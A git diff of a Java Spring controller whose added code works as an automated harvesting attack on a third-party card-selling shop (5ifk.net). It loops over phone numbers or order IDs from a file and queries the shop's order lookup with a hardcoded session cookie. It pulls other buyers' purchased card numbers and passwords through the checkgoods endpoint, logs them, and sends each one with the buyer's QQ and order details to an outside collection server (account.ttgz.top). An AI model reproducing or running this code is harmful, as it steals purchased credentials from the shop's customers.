@@ -1,6 +1,7 @@
 package com.sms.api.controller;
 
 import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.JSONObject;
 import com.sms.api.dao.SMSDao;
 import com.sms.api.model.SmsEnt;
 import com.sms.api.service.RedisService;
@@ -15,11 +16,14 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
 import javax.annotation.Resource;
+import java.io.File;
 import java.io.IOException;
-import java.util.Calendar;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
+import java.net.URLEncoder;
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import static com.sms.api.controller.SMSController.*;
 
 /**
  * @program: api
@@ -33,6 +37,9 @@ public class OrderController {
 
     @Value("${cs.cookie}")
     private String cookie;
+
+    public static Double onePrice=0.0;
+
 
     @Autowired
     SMSDao smsDao;
@@ -137,20 +144,101 @@ public class OrderController {
     }
 
 
-    public static void main(String[] args) throws IOException {
+    public static void main(String[] args) throws IOException, InterruptedException {
+//getCar("123456");
+        while (true){
+            Calendar now = Calendar.getInstance();
+            String h = (now.get(Calendar.HOUR_OF_DAY)<=9?"0"+now.get(Calendar.HOUR_OF_DAY):now.get(Calendar.HOUR_OF_DAY)+"");
+            System.out.println(h);
+            if (Integer.parseInt(h)>8) {
+                Map<String,Object> data = new HashMap<>();
+                String[] gets = getList(new File("mhh.txt"));
+                for (String s:gets){
+                    getCar(s.trim());
+                    Thread.sleep(800);
+                }
+            }else {
+                Thread.sleep(1000*60*60);
+            }
 
-    String a = "CS200501032002899510/l/d9410de3e0cd8c32927bb2c6c37685f1";
-
-        System.out.println(a.substring(4,10));
-        Calendar now = Calendar.getInstance();
-
-        String m = ((now.get(Calendar.MONTH) + 1)<=9?"0"+(now.get(Calendar.MONTH) + 1):(now.get(Calendar.MONTH) + 1)+"");
-        String d = (now.get(Calendar.DAY_OF_MONTH)<=9?"0"+now.get(Calendar.DAY_OF_MONTH):now.get(Calendar.DAY_OF_MONTH)+"");
-        String h = (now.get(Calendar.HOUR_OF_DAY)<=9?"0"+now.get(Calendar.HOUR_OF_DAY):now.get(Calendar.HOUR_OF_DAY)+"");
-        String nows = m+d+h;
+        }
 
 
     }
+
+
+
+    public static void getCar(String phone) throws IOException, InterruptedException {
+        Map<String,String> head = new HashMap<>();
+        head.put("cookie","UM_distinctid=1748a8c6c15369-0c48b44b7e561f-316d7005-384000-1748a8c6c16a24; sd0406650=snp2j2psram77co8c8295ca6s0; CNZZDATA1279029842=1310953567-1600249785-%7C1600249785");
+        String url = "http://www.5ifk.net";
+        String queryRes = HttpClientUtil.get(url+"/orderquery?orderid="+phone+"&chkcode="+getCk()+"&querytype=3",head);
+//        System.out.println(queryRes);
+        List<String> orderIds = PatternUtil.between(queryRes,"/orderquery/orderid/","\"",1);
+        String title = PatternUtil.between(queryRes,"<p>","</p>");
+        for (int i=0;i<orderIds.size();i++){
+            Thread.sleep(200);
+            String times = orderIds.get(i).substring(5,11);
+            if(!getRun(times,"快手")) {
+                continue;
+            }
+            String res = HttpClientUtil.get(url+"/orderquery/orderid/"+orderIds.get(i),head);
+            String qq = PatternUtil.between(res,"\">","</a></b>");
+
+            String sfk  = PatternUtil.between(res,"实付款：<b>","</b></p>");
+            String orderTime = PatternUtil.between(res,"订单日期：","</h3>");
+            String id = orderIds.get(i).split("/")[0];
+            String toekn = PatternUtil.between(res,"token: \"","\"");
+            if (toekn =="") {
+                continue;
+            }
+
+            String key=HttpClientUtil.get(url+"/checkgoods?orderid="+id+"&token="+toekn+"&t="+System.currentTimeMillis(),head);
+             String time = PatternUtil.between(res,"订单日期：","</h5>");
+            Map<String,Object> resData = (Map<String, Object>) JSONObject.parse(key);
+            if (resData.get("quantity")==null || StringUtils.isEmpty(sfk)) {
+                onePrice=0.0;
+            }else {
+                onePrice=(Double.parseDouble(sfk)/Integer.parseInt(resData.get("quantity").toString()));
+            }
+
+            addFile("mhhcar.txt",orderTime+"--"+onePrice+"--"+qq+"-----"+(extract((resData.get("msg")!=null?resData.get("msg").toString():""),phone,orderTime,qq+"--"+onePrice))+"\n");
+            System.err.println(resData);
+        }
+
+
+    }
+
+
+
+    public static Pattern pattern = Pattern.compile("COM(.+)<a.+卡密：(.+)<a");
+
+    public static List<String> extract(String html,String qq,String time,String title) {
+        html = html.replace("\n", "");
+        String[] card_items = html.split("卡号：");
+        List<String> cardList = new ArrayList<>();
+        for (String card_item : card_items) {
+            Matcher matcher = pattern.matcher(card_item);
+            if (matcher.find()) {
+                String cardNumber = matcher.group(1);
+                String cardPass = matcher.group(2);
+                cardList.add("COM"+cardNumber + "--" + cardPass);
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            String s = HttpClientUtil.get("http://account.ttgz.top/ks/addAccount?key=COM"+cardNumber+"&mobile="+cardPass+"&qq="+qq+"&time="+ URLEncoder.encode( time, "UTF-8" )+"&title="+URLEncoder.encode( title, "UTF-8" ));
+                            System.out.println(s);
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                }).start();
+            }
+        }
+        return cardList;
+    }
+
 
 
 
